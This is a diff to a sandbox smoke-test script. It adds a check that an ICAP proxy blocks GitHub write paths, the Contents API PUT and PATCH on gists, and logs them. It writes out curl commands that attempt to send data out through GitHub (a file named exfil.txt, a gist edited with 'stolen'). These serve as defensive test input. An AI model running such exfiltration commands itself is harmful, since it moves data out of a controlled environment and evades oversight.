@@ -20,6 +20,7 @@
 #  19. Package cooldown: env vars + config files absent when cooldown is disabled (0)
 #  20. SANDBOX_VARIANT env var is set to 'standard' in the default image
 #  21. GitHub API endpoint blocking: POST /gists is blocked by ICAP scanner
+#  22. GitHub API endpoint blocking: E2 repo write paths blocked (Contents API, PATCH /gists/{id})
 #
 # Usage:
 #   bash test/smoke.sh            # from project root
@@ -806,6 +807,60 @@ if [ "${GIST_BLOCK_AFTER}" -gt "${GIST_BLOCK_BASELINE}" ]; then
     fi
 else
     fail "GitHub API endpoint blocking: POST /gists was not logged in exfil.log (no new entries)"
+fi
+
+echo ""
+
+# ── 22. GitHub API endpoint blocking — E2 repo write paths ───────────────────
+#
+# Verify that the ICAP scanner blocks:
+#   (a) PUT /repos/{owner}/{repo}/contents/{path} — Contents API file write
+#   (b) PATCH /gists/{id}                         — edit existing gist
+#
+# Both should produce GITHUB-API-BLOCK entries in exfil.log. The requests
+# will return 403 from the ICAP scanner before reaching GitHub, so no valid
+# token is required.
+
+echo "── 22. Testing GitHub API endpoint blocking (E2 repo write paths)..."
+
+E2_BLOCK_BASELINE=$(docker exec "$PROXY_CID" \
+    sh -c "wc -l < /var/log/squid/exfil.log 2>/dev/null || echo 0" | tr -d '[:space:]')
+
+# (a) Attempt Contents API file write
+run_online "curl -sf --max-time 10 -X PUT \
+    -H 'Content-Type: application/json' \
+    -d '{\"message\":\"test\",\"content\":\"dGVzdA==\"}' \
+    https://api.github.com/repos/test-owner/test-repo/contents/exfil.txt \
+    -o /dev/null 2>/dev/null" || true
+
+# (b) Attempt to edit an existing gist
+run_online "curl -sf --max-time 10 -X PATCH \
+    -H 'Content-Type: application/json' \
+    -d '{\"files\":{\"test.txt\":{\"content\":\"stolen\"}}}' \
+    https://api.github.com/gists/fakegistid1234567890 \
+    -o /dev/null 2>/dev/null" || true
+
+sleep 2
+
+E2_BLOCK_AFTER=$(docker exec "$PROXY_CID" \
+    sh -c "wc -l < /var/log/squid/exfil.log 2>/dev/null || echo 0" | tr -d '[:space:]')
+
+if [ "${E2_BLOCK_AFTER}" -gt "${E2_BLOCK_BASELINE}" ]; then
+    NEW_ENTRIES=$(docker exec "$PROXY_CID" \
+        sh -c "tail -n $((E2_BLOCK_AFTER - E2_BLOCK_BASELINE)) /var/log/squid/exfil.log 2>/dev/null || echo ''")
+    CONTENTS_BLOCKED=$(echo "$NEW_ENTRIES" | grep -c "GITHUB-API-BLOCK.*contents" || true)
+    GIST_PATCH_BLOCKED=$(echo "$NEW_ENTRIES" | grep -c "GITHUB-API-BLOCK.*gists" || true)
+    if [ "${CONTENTS_BLOCKED}" -gt 0 ] && [ "${GIST_PATCH_BLOCKED}" -gt 0 ]; then
+        pass "GitHub API endpoint blocking (E2): Contents API write and PATCH /gists/{id} both blocked"
+    elif [ "${CONTENTS_BLOCKED}" -gt 0 ]; then
+        fail "GitHub API endpoint blocking (E2): Contents API write blocked but PATCH /gists/{id} was not"
+    elif [ "${GIST_PATCH_BLOCKED}" -gt 0 ]; then
+        fail "GitHub API endpoint blocking (E2): PATCH /gists/{id} blocked but Contents API write was not"
+    else
+        fail "GitHub API endpoint blocking (E2): neither Contents API write nor PATCH /gists/{id} were blocked (got: '${NEW_ENTRIES}')"
+    fi
+else
+    fail "GitHub API endpoint blocking (E2): no new GITHUB-API-BLOCK entries in exfil.log"
 fi
 
 echo ""
